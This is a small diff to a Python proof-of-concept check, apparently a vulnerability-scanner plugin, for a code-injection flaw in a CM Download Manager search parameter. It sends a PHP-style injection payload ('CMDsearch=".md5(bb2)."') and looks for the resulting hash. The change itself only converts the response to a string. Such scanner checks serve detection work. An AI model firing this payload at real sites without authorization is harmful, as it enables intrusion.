@@ -58,7 +58,7 @@ class Poc(ABPoc):
             payload = '/cmdownloads/?CMDsearch=".md5(bb2)."'
             verify_url = '{target}'.format(target=self.target)+payload
             response = urllib.request.urlopen(verify_url)
-            content = response.read()
+            content = str(response.read())
             match = re.search('0c72305dbeb0ed430b79ec9fc5fe8505', content)
             if match:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
